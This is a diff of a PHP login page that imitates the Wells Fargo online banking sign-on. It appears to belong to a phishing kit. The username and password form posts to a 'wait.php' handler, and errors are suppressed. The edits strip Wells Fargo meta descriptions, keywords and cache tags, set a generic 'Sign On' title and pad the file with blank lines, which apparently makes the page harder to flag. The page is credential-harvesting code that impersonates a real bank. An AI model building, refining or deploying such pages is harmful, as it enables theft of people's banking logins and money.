@@ -1,3 +1,52 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <?php
 session_start();
 error_reporting(0);
@@ -25,18 +74,10 @@ if( isset($_GET['id'])){
     <meta http-equiv="content-type" content="text/html; charset=UTF-8">
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages &amp; More</title>
-    <meta name="description" content="Wells Fargo: Provider of banking, mortgage, investing, credit card, and personal, small business, and commercial financial services. Learn more.">
-    <meta name="keywords" content="checking accounts, savings accounts, student loans, personal loans, investments, online banking, auto loans, home loans">
+    <title>Sign On<?=$id?></title>
     <meta name="robots" content="index, follow">
     <meta name="search_category" content="Personal">
     <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
-    <meta http-equiv="Cache-Control" content="must-revalidate">
-    <meta http-equiv="Cache-Control" content="no-store">
-    <meta http-equiv="Cache-Control" content="no-cache">
-    <meta http-equiv="Cache-Control" content="private">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta name="apple-itunes-app" content="app-id=311548709">
 
     <link rel="shortcut icon" type="image/x-icon" href="../files/icons/favicon.ico">
     <link rel="apple-touch-icon" sizes="120x120" href="../files/icons/apple-touch-icon-120x120.png">
@@ -86,6 +127,15 @@ if( isset($_GET['id'])){
                     </div>
                     <div class="signOnContainer" align="center">
                         <form id="frmSignon" name="frmSignon" action="wait.php?id=<?=$id?>" method="post" autocomplete="off">
+                            <?php
+                            if( $error != ""){
+                            ?>
+                            <p style="color: red; font-size: 1.2em; font-weight: bold;">
+                                Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
+                            </p>
+                            <?php
+                            }
+                            ?>
                             <label class="sr-only" for="userid">Username</label>
 
                             <input type="text" maxlength="14" id="userid" placeholder="Username" class="required" name="j_username">
@@ -108,15 +158,6 @@ if( isset($_GET['id'])){
                                 <a href="#" class="enroll-text">Forgot Password/Username?</a>
                             </div>
                             <div class="enroll-header">&copy; 2019 <em>Wells Fargo Online</em><sup>®</sup></div>
-                            <?php
-                            if( $error != ""){
-                            ?>
-                            <p style="color: red; font-size: 1.2em; font-weight: bold;">
-                                Some or all of the fields you have completed might be incorrect or incomplete. Please review your input.
-                            </p>
-                            <?php
-                            }
-                            ?>
                         </form>
                     </div>
                     <div class="appstoreBadge" id="ios">
@@ -155,3 +196,4 @@ if( isset($_GET['id'])){
     </div>
 </body>
 </html>
+
